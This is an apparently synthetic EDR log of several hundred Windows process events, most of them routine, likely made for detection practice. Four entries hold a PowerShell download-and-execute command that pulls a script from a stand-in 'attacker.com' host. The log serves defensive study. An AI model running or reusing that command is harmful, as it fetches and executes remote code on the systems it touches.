2026-04-14T00:20:33.000Z [EDR] user=system proc=svchost.exe action=REGISTRY_MOD details="PID: 4709"
2026-04-14T00:21:03.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 7511"
2026-04-14T00:21:33.000Z [EDR] user=admin proc=cmd.exe action=FILE_CREATE details="PID: 3290"
2026-04-14T00:22:03.000Z [EDR] user=system proc=svchost.exe action=NETWORK_CONN details="PID: 4554"
2026-04-14T00:22:33.000Z [EDR] user=system proc=explorer.exe action=REGISTRY_MOD details="PID: 5299"
2026-04-14T00:23:03.000Z [EDR] user=service_acct proc=powershell.exe action=FILE_CREATE details="PID: 3556"
2026-04-14T00:23:33.000Z [EDR] user=alice proc=chrome.exe action=FILE_CREATE details="PID: 7043"
2026-04-14T00:24:03.000Z [EDR] user=admin proc=chrome.exe action=NETWORK_CONN details="PID: 6831"
2026-04-14T00:24:33.000Z [EDR] user=system proc=svchost.exe action=NETWORK_CONN details="PID: 3081"
2026-04-14T00:25:03.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 4745"
2026-04-14T00:25:33.000Z [EDR] user=alice proc=explorer.exe action=PROCESS_START details="PID: 4552"
2026-04-14T00:26:03.000Z [EDR] user=system proc=explorer.exe action=FILE_CREATE details="PID: 5809"
2026-04-14T00:26:33.000Z [EDR] user=bob proc=cmd.exe action=PROCESS_START details="PID: 3258"
2026-04-14T00:27:03.000Z [EDR] user=service_acct proc=cmd.exe action=FILE_CREATE details="PID: 8469"
2026-04-14T00:27:33.000Z [EDR] user=service_acct proc=svchost.exe action=FILE_CREATE details="PID: 2540"
2026-04-14T00:28:03.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 2848"
2026-04-14T00:28:33.000Z [EDR] user=service_acct proc=chrome.exe action=NETWORK_CONN details="PID: 2642"
2026-04-14T00:29:03.000Z [EDR] user=alice proc=svchost.exe action=FILE_CREATE details="PID: 3087"
2026-04-14T00:29:33.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 6281"
2026-04-14T00:30:03.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 8995"
2026-04-14T00:30:33.000Z [EDR] user=service_acct proc=chrome.exe action=FILE_CREATE details="PID: 3580"
2026-04-14T00:31:03.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 7103"
2026-04-14T00:31:33.000Z [EDR] user=system proc=powershell.exe action=FILE_CREATE details="PID: 4537"
2026-04-14T00:32:03.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 4190"
2026-04-14T00:32:33.000Z [EDR] user=alice proc=explorer.exe action=PROCESS_START details="PID: 3847"
2026-04-14T00:33:03.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 2294"
2026-04-14T00:33:33.000Z [EDR] user=bob proc=powershell.exe action=NETWORK_CONN details="PID: 4703"
2026-04-14T00:34:03.000Z [EDR] user=service_acct proc=svchost.exe action=PROCESS_START details="PID: 3976"
2026-04-14T00:34:33.000Z [EDR] user=system proc=cmd.exe action=NETWORK_CONN details="PID: 1623"
2026-04-14T00:35:03.000Z [EDR] user=alice proc=explorer.exe action=PROCESS_START details="PID: 3360"
2026-04-14T00:35:33.000Z [EDR] user=system proc=cmd.exe action=FILE_CREATE details="PID: 3543"
2026-04-14T00:36:03.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 5860"
2026-04-14T00:36:33.000Z [EDR] user=system proc=chrome.exe action=REGISTRY_MOD details="PID: 8246"
2026-04-14T00:37:03.000Z [EDR] user=admin proc=cmd.exe action=REGISTRY_MOD details="PID: 3439"
2026-04-14T00:37:33.000Z [EDR] user=bob proc=cmd.exe action=REGISTRY_MOD details="PID: 7581"
2026-04-14T00:38:03.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T00:38:33.000Z [EDR] user=service_acct proc=explorer.exe action=NETWORK_CONN details="PID: 3317"
2026-04-14T00:39:03.000Z [EDR] user=system proc=powershell.exe action=REGISTRY_MOD details="PID: 6283"
2026-04-14T00:39:33.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 4462"
2026-04-14T00:40:03.000Z [EDR] user=admin proc=svchost.exe action=NETWORK_CONN details="PID: 1513"
2026-04-14T00:40:33.000Z [EDR] user=service_acct proc=powershell.exe action=REGISTRY_MOD details="PID: 5614"
2026-04-14T00:41:03.000Z [EDR] user=admin proc=powershell.exe action=FILE_CREATE details="PID: 1983"
2026-04-14T00:41:33.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 5488"
2026-04-14T00:42:03.000Z [EDR] user=alice proc=explorer.exe action=REGISTRY_MOD details="PID: 8748"
2026-04-14T00:42:33.000Z [EDR] user=bob proc=powershell.exe action=PROCESS_START details="PID: 1573"
2026-04-14T00:43:03.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 3698"
2026-04-14T00:43:33.000Z [EDR] user=bob proc=chrome.exe action=REGISTRY_MOD details="PID: 5305"
2026-04-14T00:44:03.000Z [EDR] user=bob proc=cmd.exe action=FILE_CREATE details="PID: 7919"
2026-04-14T00:44:33.000Z [EDR] user=service_acct proc=chrome.exe action=PROCESS_START details="PID: 4242"
2026-04-14T00:45:03.000Z [EDR] user=bob proc=explorer.exe action=PROCESS_START details="PID: 8590"
2026-04-14T00:45:33.000Z [EDR] user=alice proc=svchost.exe action=NETWORK_CONN details="PID: 2592"
2026-04-14T00:46:03.000Z [EDR] user=service_acct proc=chrome.exe action=FILE_CREATE details="PID: 4969"
2026-04-14T00:46:33.000Z [EDR] user=service_acct proc=svchost.exe action=PROCESS_START details="PID: 7541"
2026-04-14T00:47:03.000Z [EDR] user=alice proc=cmd.exe action=REGISTRY_MOD details="PID: 3790"
2026-04-14T00:47:33.000Z [EDR] user=service_acct proc=chrome.exe action=PROCESS_START details="PID: 1590"
2026-04-14T00:48:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 6440"
2026-04-14T00:48:33.000Z [EDR] user=service_acct proc=cmd.exe action=PROCESS_START details="PID: 2915"
2026-04-14T00:49:03.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 3362"
2026-04-14T00:49:33.000Z [EDR] user=bob proc=powershell.exe action=FILE_CREATE details="PID: 2955"
2026-04-14T00:50:03.000Z [EDR] user=system proc=svchost.exe action=REGISTRY_MOD details="PID: 8789"
2026-04-14T00:50:33.000Z [EDR] user=alice proc=cmd.exe action=REGISTRY_MOD details="PID: 3567"
2026-04-14T00:51:03.000Z [EDR] user=system proc=explorer.exe action=REGISTRY_MOD details="PID: 1571"
2026-04-14T00:51:33.000Z [EDR] user=alice proc=chrome.exe action=NETWORK_CONN details="PID: 3003"
2026-04-14T00:52:03.000Z [EDR] user=bob proc=powershell.exe action=NETWORK_CONN details="PID: 2803"
2026-04-14T00:52:33.000Z [EDR] user=admin proc=cmd.exe action=NETWORK_CONN details="PID: 2023"
2026-04-14T00:53:03.000Z [EDR] user=alice proc=explorer.exe action=NETWORK_CONN details="PID: 2603"
2026-04-14T00:53:33.000Z [EDR] user=system proc=explorer.exe action=FILE_CREATE details="PID: 5043"
2026-04-14T00:54:03.000Z [EDR] user=bob proc=chrome.exe action=PROCESS_START details="PID: 2665"
2026-04-14T00:54:33.000Z [EDR] user=bob proc=chrome.exe action=FILE_CREATE details="PID: 5984"
2026-04-14T00:55:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="PID: 1156"
2026-04-14T00:55:33.000Z [EDR] user=system proc=powershell.exe action=PROCESS_START details="PID: 2532"
2026-04-14T00:56:03.000Z [EDR] user=system proc=chrome.exe action=FILE_CREATE details="PID: 5649"
2026-04-14T00:56:33.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 2188"
2026-04-14T00:57:03.000Z [EDR] user=service_acct proc=explorer.exe action=PROCESS_START details="PID: 5664"
2026-04-14T00:57:33.000Z [EDR] user=bob proc=explorer.exe action=PROCESS_START details="PID: 1056"
2026-04-14T00:58:03.000Z [EDR] user=admin proc=cmd.exe action=FILE_CREATE details="PID: 4218"
2026-04-14T00:58:33.000Z [EDR] user=admin proc=cmd.exe action=REGISTRY_MOD details="PID: 5930"
2026-04-14T00:59:03.000Z [EDR] user=alice proc=svchost.exe action=PROCESS_START details="PID: 6927"
2026-04-14T00:59:33.000Z [EDR] user=bob proc=cmd.exe action=PROCESS_START details="PID: 1863"
2026-04-14T01:00:03.000Z [EDR] user=system proc=explorer.exe action=FILE_CREATE details="PID: 6509"
2026-04-14T01:00:33.000Z [EDR] user=system proc=svchost.exe action=REGISTRY_MOD details="PID: 7999"
2026-04-14T01:01:03.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="PID: 6728"
2026-04-14T01:01:33.000Z [EDR] user=system proc=explorer.exe action=PROCESS_START details="PID: 7384"
2026-04-14T01:02:03.000Z [EDR] user=alice proc=powershell.exe action=FILE_CREATE details="PID: 6670"
2026-04-14T01:02:33.000Z [EDR] user=bob proc=cmd.exe action=REGISTRY_MOD details="PID: 1817"
2026-04-14T01:03:03.000Z [EDR] user=bob proc=powershell.exe action=REGISTRY_MOD details="PID: 1291"
2026-04-14T01:03:33.000Z [EDR] user=service_acct proc=explorer.exe action=PROCESS_START details="PID: 4181"
2026-04-14T01:04:03.000Z [EDR] user=alice proc=chrome.exe action=NETWORK_CONN details="PID: 3982"
2026-04-14T01:04:33.000Z [EDR] user=system proc=chrome.exe action=NETWORK_CONN details="PID: 5048"
2026-04-14T01:05:03.000Z [EDR] user=alice proc=cmd.exe action=REGISTRY_MOD details="PID: 2742"
2026-04-14T01:05:33.000Z [EDR] user=admin proc=svchost.exe action=REGISTRY_MOD details="PID: 6134"
2026-04-14T01:06:03.000Z [EDR] user=admin proc=cmd.exe action=FILE_CREATE details="PID: 1519"
2026-04-14T01:06:33.000Z [EDR] user=alice proc=cmd.exe action=FILE_CREATE details="PID: 1224"
2026-04-14T01:07:03.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 8606"
2026-04-14T01:07:33.000Z [EDR] user=admin proc=explorer.exe action=NETWORK_CONN details="PID: 3903"
2026-04-14T01:08:03.000Z [EDR] user=system proc=chrome.exe action=NETWORK_CONN details="PID: 6767"
2026-04-14T01:08:33.000Z [EDR] user=admin proc=explorer.exe action=NETWORK_CONN details="PID: 7637"
2026-04-14T01:09:03.000Z [EDR] user=alice proc=cmd.exe action=FILE_CREATE details="PID: 7640"
2026-04-14T01:09:33.000Z [EDR] user=admin proc=explorer.exe action=FILE_CREATE details="PID: 3396"
2026-04-14T01:10:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="PID: 3716"
2026-04-14T01:10:33.000Z [EDR] user=service_acct proc=powershell.exe action=REGISTRY_MOD details="PID: 8646"
2026-04-14T01:11:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="PID: 3223"
2026-04-14T01:11:33.000Z [EDR] user=admin proc=chrome.exe action=REGISTRY_MOD details="PID: 3161"
2026-04-14T01:12:03.000Z [EDR] user=alice proc=svchost.exe action=PROCESS_START details="PID: 1263"
2026-04-14T01:12:33.000Z [EDR] user=system proc=cmd.exe action=PROCESS_START details="PID: 5614"
2026-04-14T01:13:03.000Z [EDR] user=bob proc=chrome.exe action=FILE_CREATE details="PID: 5643"
2026-04-14T01:13:33.000Z [EDR] user=admin proc=svchost.exe action=REGISTRY_MOD details="PID: 6585"
2026-04-14T01:14:03.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 7278"
2026-04-14T01:14:33.000Z [EDR] user=alice proc=cmd.exe action=PROCESS_START details="PID: 6074"
2026-04-14T01:15:03.000Z [EDR] user=admin proc=powershell.exe action=FILE_CREATE details="PID: 1060"
2026-04-14T01:15:33.000Z [EDR] user=system proc=cmd.exe action=NETWORK_CONN details="PID: 7815"
2026-04-14T01:16:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="PID: 4035"
2026-04-14T01:16:33.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 2364"
2026-04-14T01:17:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T01:17:33.000Z [EDR] user=service_acct proc=svchost.exe action=PROCESS_START details="PID: 3919"
2026-04-14T01:18:03.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 3794"
2026-04-14T01:18:33.000Z [EDR] user=system proc=powershell.exe action=REGISTRY_MOD details="PID: 7691"
2026-04-14T01:19:03.000Z [EDR] user=admin proc=chrome.exe action=NETWORK_CONN details="PID: 1467"
2026-04-14T01:19:33.000Z [EDR] user=alice proc=chrome.exe action=FILE_CREATE details="PID: 3530"
2026-04-14T01:20:03.000Z [EDR] user=admin proc=svchost.exe action=PROCESS_START details="PID: 6438"
2026-04-14T01:20:33.000Z [EDR] user=admin proc=explorer.exe action=NETWORK_CONN details="PID: 1559"
2026-04-14T01:21:03.000Z [EDR] user=alice proc=chrome.exe action=REGISTRY_MOD details="PID: 5031"
2026-04-14T01:21:33.000Z [EDR] user=service_acct proc=cmd.exe action=FILE_CREATE details="PID: 2679"
2026-04-14T01:22:03.000Z [EDR] user=alice proc=chrome.exe action=NETWORK_CONN details="PID: 2109"
2026-04-14T01:22:33.000Z [EDR] user=alice proc=chrome.exe action=REGISTRY_MOD details="PID: 6859"
2026-04-14T01:23:03.000Z [EDR] user=service_acct proc=cmd.exe action=FILE_CREATE details="PID: 2041"
2026-04-14T01:23:33.000Z [EDR] user=admin proc=svchost.exe action=PROCESS_START details="PID: 5002"
2026-04-14T01:24:03.000Z [EDR] user=service_acct proc=chrome.exe action=PROCESS_START details="PID: 3279"
2026-04-14T01:24:33.000Z [EDR] user=system proc=svchost.exe action=NETWORK_CONN details="PID: 8590"
2026-04-14T01:25:03.000Z [EDR] user=admin proc=svchost.exe action=REGISTRY_MOD details="PID: 6976"
2026-04-14T01:25:33.000Z [EDR] user=alice proc=chrome.exe action=NETWORK_CONN details="PID: 8965"
2026-04-14T01:26:03.000Z [EDR] user=alice proc=powershell.exe action=REGISTRY_MOD details="PID: 2760"
2026-04-14T01:26:33.000Z [EDR] user=bob proc=svchost.exe action=PROCESS_START details="PID: 7555"
2026-04-14T01:27:03.000Z [EDR] user=service_acct proc=powershell.exe action=NETWORK_CONN details="PID: 4673"
2026-04-14T01:27:33.000Z [EDR] user=alice proc=svchost.exe action=PROCESS_START details="PID: 5967"
2026-04-14T01:28:03.000Z [EDR] user=alice proc=chrome.exe action=NETWORK_CONN details="PID: 8970"
2026-04-14T01:28:33.000Z [EDR] user=admin proc=chrome.exe action=NETWORK_CONN details="PID: 1777"
2026-04-14T01:29:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 1217"
2026-04-14T01:29:33.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 8196"
2026-04-14T01:30:03.000Z [EDR] user=bob proc=svchost.exe action=PROCESS_START details="PID: 1023"
2026-04-14T01:30:33.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 2969"
2026-04-14T01:31:03.000Z [EDR] user=alice proc=chrome.exe action=PROCESS_START details="PID: 1591"
2026-04-14T01:31:33.000Z [EDR] user=service_acct proc=chrome.exe action=FILE_CREATE details="PID: 1631"
2026-04-14T01:32:03.000Z [EDR] user=admin proc=powershell.exe action=REGISTRY_MOD details="PID: 6084"
2026-04-14T01:32:33.000Z [EDR] user=bob proc=powershell.exe action=PROCESS_START details="PID: 2468"
2026-04-14T01:33:03.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 3689"
2026-04-14T01:33:33.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 8907"
2026-04-14T01:34:03.000Z [EDR] user=alice proc=powershell.exe action=REGISTRY_MOD details="PID: 1436"
2026-04-14T01:34:33.000Z [EDR] user=service_acct proc=powershell.exe action=PROCESS_START details="PID: 3305"
2026-04-14T01:35:03.000Z [EDR] user=bob proc=powershell.exe action=REGISTRY_MOD details="PID: 8331"
2026-04-14T01:35:33.000Z [EDR] user=admin proc=svchost.exe action=REGISTRY_MOD details="PID: 1477"
2026-04-14T01:36:03.000Z [EDR] user=admin proc=chrome.exe action=REGISTRY_MOD details="PID: 5229"
2026-04-14T01:36:33.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 8131"
2026-04-14T01:37:03.000Z [EDR] user=bob proc=chrome.exe action=REGISTRY_MOD details="PID: 7056"
2026-04-14T01:37:33.000Z [EDR] user=bob proc=cmd.exe action=REGISTRY_MOD details="PID: 1861"
2026-04-14T01:38:03.000Z [EDR] user=alice proc=powershell.exe action=PROCESS_START details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T01:38:33.000Z [EDR] user=bob proc=chrome.exe action=PROCESS_START details="PID: 5691"
2026-04-14T01:39:03.000Z [EDR] user=alice proc=explorer.exe action=NETWORK_CONN details="PID: 5312"
2026-04-14T01:39:33.000Z [EDR] user=admin proc=chrome.exe action=FILE_CREATE details="PID: 6408"
2026-04-14T01:40:03.000Z [EDR] user=system proc=svchost.exe action=NETWORK_CONN details="PID: 1191"
2026-04-14T01:40:33.000Z [EDR] user=bob proc=chrome.exe action=PROCESS_START details="PID: 3338"
2026-04-14T01:41:03.000Z [EDR] user=alice proc=svchost.exe action=REGISTRY_MOD details="PID: 2500"
2026-04-14T01:41:33.000Z [EDR] user=system proc=chrome.exe action=REGISTRY_MOD details="PID: 1256"
2026-04-14T01:42:03.000Z [EDR] user=bob proc=cmd.exe action=PROCESS_START details="PID: 6861"
2026-04-14T01:42:33.000Z [EDR] user=alice proc=chrome.exe action=NETWORK_CONN details="PID: 4116"
2026-04-14T01:43:03.000Z [EDR] user=service_acct proc=powershell.exe action=NETWORK_CONN details="PID: 7712"
2026-04-14T01:43:33.000Z [EDR] user=admin proc=chrome.exe action=NETWORK_CONN details="PID: 8767"
2026-04-14T01:44:03.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 7365"
2026-04-14T01:44:33.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="PID: 8674"
2026-04-14T01:45:03.000Z [EDR] user=service_acct proc=chrome.exe action=NETWORK_CONN details="PID: 4442"
2026-04-14T01:45:33.000Z [EDR] user=bob proc=cmd.exe action=REGISTRY_MOD details="PID: 1418"
2026-04-14T01:46:03.000Z [EDR] user=system proc=explorer.exe action=REGISTRY_MOD details="PID: 1443"
2026-04-14T01:46:33.000Z [EDR] user=bob proc=explorer.exe action=FILE_CREATE details="PID: 3776"
2026-04-14T01:47:03.000Z [EDR] user=service_acct proc=cmd.exe action=FILE_CREATE details="PID: 7164"
2026-04-14T01:47:33.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 3994"
2026-04-14T01:48:03.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 7399"
2026-04-14T01:48:33.000Z [EDR] user=service_acct proc=svchost.exe action=PROCESS_START details="PID: 2471"
2026-04-14T01:49:03.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 3180"
2026-04-14T01:49:33.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 8313"
2026-04-14T01:50:03.000Z [EDR] user=service_acct proc=svchost.exe action=NETWORK_CONN details="PID: 7123"
2026-04-14T01:50:33.000Z [EDR] user=alice proc=cmd.exe action=NETWORK_CONN details="PID: 2266"
2026-04-14T01:51:03.000Z [EDR] user=system proc=cmd.exe action=PROCESS_START details="PID: 7992"
2026-04-14T01:51:33.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 3307"
2026-04-14T01:52:03.000Z [EDR] user=system proc=chrome.exe action=NETWORK_CONN details="PID: 5485"
2026-04-14T01:52:33.000Z [EDR] user=service_acct proc=powershell.exe action=FILE_CREATE details="PID: 3868"
2026-04-14T01:53:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="PID: 8545"
2026-04-14T01:53:33.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 5615"
2026-04-14T01:54:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="PID: 6200"
2026-04-14T01:54:33.000Z [EDR] user=bob proc=chrome.exe action=REGISTRY_MOD details="PID: 6438"
2026-04-14T01:55:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 4652"
2026-04-14T01:55:33.000Z [EDR] user=service_acct proc=chrome.exe action=NETWORK_CONN details="PID: 6724"
2026-04-14T01:56:03.000Z [EDR] user=service_acct proc=powershell.exe action=REGISTRY_MOD details="PID: 4352"
2026-04-14T01:56:33.000Z [EDR] user=bob proc=cmd.exe action=PROCESS_START details="PID: 2994"
2026-04-14T01:57:03.000Z [EDR] user=system proc=svchost.exe action=REGISTRY_MOD details="PID: 6994"
2026-04-14T01:57:33.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 7889"
2026-04-14T01:58:03.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="PID: 3441"
2026-04-14T01:58:33.000Z [EDR] user=alice proc=svchost.exe action=PROCESS_START details="PID: 1834"
2026-04-14T01:59:03.000Z [EDR] user=alice proc=cmd.exe action=NETWORK_CONN details="PID: 7851"
2026-04-14T01:59:33.000Z [EDR] user=admin proc=explorer.exe action=REGISTRY_MOD details="PID: 5390"
2026-04-14T02:00:03.000Z [EDR] user=admin proc=explorer.exe action=REGISTRY_MOD details="PID: 4907"
2026-04-14T02:00:33.000Z [EDR] user=service_acct proc=svchost.exe action=NETWORK_CONN details="PID: 5714"
2026-04-14T02:01:03.000Z [EDR] user=alice proc=powershell.exe action=PROCESS_START details="PID: 6541"
2026-04-14T02:01:33.000Z [EDR] user=alice proc=svchost.exe action=FILE_CREATE details="PID: 6770"
2026-04-14T02:02:03.000Z [EDR] user=system proc=powershell.exe action=REGISTRY_MOD details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T02:02:33.000Z [EDR] user=admin proc=cmd.exe action=NETWORK_CONN details="PID: 4020"
2026-04-14T02:03:03.000Z [EDR] user=system proc=svchost.exe action=FILE_CREATE details="PID: 2261"
2026-04-14T02:03:33.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="PID: 6671"
2026-04-14T02:04:03.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 8073"
2026-04-14T02:04:33.000Z [EDR] user=system proc=chrome.exe action=PROCESS_START details="PID: 6774"
2026-04-14T02:05:03.000Z [EDR] user=service_acct proc=explorer.exe action=REGISTRY_MOD details="PID: 8882"
2026-04-14T02:05:33.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 2715"
2026-04-14T02:06:03.000Z [EDR] user=service_acct proc=explorer.exe action=PROCESS_START details="PID: 8616"
2026-04-14T02:06:33.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 5297"
2026-04-14T02:07:03.000Z [EDR] user=service_acct proc=svchost.exe action=NETWORK_CONN details="PID: 4814"
2026-04-14T02:07:33.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 5186"
2026-04-14T02:08:03.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 1253"
2026-04-14T02:08:33.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 8379"
2026-04-14T02:09:03.000Z [EDR] user=system proc=explorer.exe action=PROCESS_START details="PID: 4417"
2026-04-14T02:09:33.000Z [EDR] user=service_acct proc=svchost.exe action=PROCESS_START details="PID: 8451"
2026-04-14T02:10:03.000Z [EDR] user=system proc=svchost.exe action=NETWORK_CONN details="PID: 3402"
2026-04-14T02:10:33.000Z [EDR] user=system proc=powershell.exe action=FILE_CREATE details="PID: 8977"
2026-04-14T02:11:03.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 4663"
2026-04-14T02:11:33.000Z [EDR] user=admin proc=chrome.exe action=PROCESS_START details="PID: 7152"
2026-04-14T02:12:03.000Z [EDR] user=bob proc=explorer.exe action=PROCESS_START details="PID: 6704"
2026-04-14T02:12:33.000Z [EDR] user=bob proc=explorer.exe action=REGISTRY_MOD details="PID: 7438"
2026-04-14T02:13:03.000Z [EDR] user=alice proc=cmd.exe action=REGISTRY_MOD details="PID: 8338"
2026-04-14T02:13:33.000Z [EDR] user=service_acct proc=explorer.exe action=PROCESS_START details="PID: 5345"
2026-04-14T02:14:03.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 8740"
2026-04-14T02:14:33.000Z [EDR] user=bob proc=chrome.exe action=FILE_CREATE details="PID: 8918"
2026-04-14T02:15:03.000Z [EDR] user=admin proc=svchost.exe action=NETWORK_CONN details="PID: 3800"
2026-04-14T02:15:33.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 5107"
2026-04-14T02:16:03.000Z [EDR] user=service_acct proc=svchost.exe action=NETWORK_CONN details="PID: 3845"
2026-04-14T02:16:33.000Z [EDR] user=bob proc=cmd.exe action=FILE_CREATE details="PID: 6141"
2026-04-14T02:17:03.000Z [EDR] user=system proc=svchost.exe action=FILE_CREATE details="PID: 2545"
2026-04-14T02:17:33.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 3549"
2026-04-14T02:18:03.000Z [EDR] user=admin proc=powershell.exe action=FILE_CREATE details="PID: 7073"
2026-04-14T02:18:33.000Z [EDR] user=admin proc=svchost.exe action=NETWORK_CONN details="PID: 7215"
2026-04-14T02:19:03.000Z [EDR] user=alice proc=explorer.exe action=PROCESS_START details="PID: 1298"
2026-04-14T02:19:33.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 7178"
2026-04-14T02:20:03.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 7720"
2026-04-14T02:20:33.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 2429"
2026-04-14T02:21:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 6007"
2026-04-14T02:21:33.000Z [EDR] user=alice proc=explorer.exe action=FILE_CREATE details="PID: 7859"
2026-04-14T02:22:03.000Z [EDR] user=bob proc=explorer.exe action=FILE_CREATE details="PID: 4438"
2026-04-14T02:22:33.000Z [EDR] user=service_acct proc=chrome.exe action=NETWORK_CONN details="PID: 8030"
2026-04-14T02:23:03.000Z [EDR] user=alice proc=cmd.exe action=NETWORK_CONN details="PID: 5907"
2026-04-14T02:23:33.000Z [EDR] user=alice proc=powershell.exe action=FILE_CREATE details="PID: 5704"
2026-04-14T02:24:03.000Z [EDR] user=bob proc=explorer.exe action=PROCESS_START details="PID: 5510"
2026-04-14T02:24:33.000Z [EDR] user=service_acct proc=svchost.exe action=PROCESS_START details="PID: 8179"
2026-04-14T02:25:03.000Z [EDR] user=service_acct proc=chrome.exe action=PROCESS_START details="PID: 6918"
2026-04-14T02:25:33.000Z [EDR] user=service_acct proc=cmd.exe action=REGISTRY_MOD details="PID: 4503"
2026-04-14T02:26:03.000Z [EDR] user=alice proc=explorer.exe action=REGISTRY_MOD details="PID: 7506"
2026-04-14T02:26:33.000Z [EDR] user=system proc=cmd.exe action=PROCESS_START details="PID: 4022"
2026-04-14T02:27:03.000Z [EDR] user=bob proc=chrome.exe action=FILE_CREATE details="PID: 5260"
2026-04-14T02:27:33.000Z [EDR] user=system proc=explorer.exe action=PROCESS_START details="PID: 2093"
2026-04-14T02:28:03.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 2250"
2026-04-14T02:28:33.000Z [EDR] user=alice proc=chrome.exe action=REGISTRY_MOD details="PID: 1844"
2026-04-14T02:29:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 7638"
2026-04-14T02:29:33.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 7977"
2026-04-14T02:30:03.000Z [EDR] user=service_acct proc=chrome.exe action=NETWORK_CONN details="PID: 8176"
2026-04-14T02:30:33.000Z [EDR] user=admin proc=cmd.exe action=FILE_CREATE details="PID: 8024"
2026-04-14T02:31:03.000Z [EDR] user=bob proc=chrome.exe action=FILE_CREATE details="PID: 4060"
2026-04-14T02:31:33.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 8683"
2026-04-14T02:32:03.000Z [EDR] user=alice proc=cmd.exe action=NETWORK_CONN details="PID: 8730"
2026-04-14T02:32:33.000Z [EDR] user=alice proc=chrome.exe action=PROCESS_START details="PID: 6741"
2026-04-14T02:33:03.000Z [EDR] user=alice proc=svchost.exe action=PROCESS_START details="PID: 7073"
2026-04-14T02:33:33.000Z [EDR] user=admin proc=svchost.exe action=REGISTRY_MOD details="PID: 1662"
2026-04-14T02:34:03.000Z [EDR] user=admin proc=cmd.exe action=FILE_CREATE details="PID: 2636"
2026-04-14T02:34:33.000Z [EDR] user=admin proc=chrome.exe action=REGISTRY_MOD details="PID: 6709"
2026-04-14T02:35:03.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 5429"
2026-04-14T02:35:33.000Z [EDR] user=alice proc=chrome.exe action=FILE_CREATE details="PID: 6469"
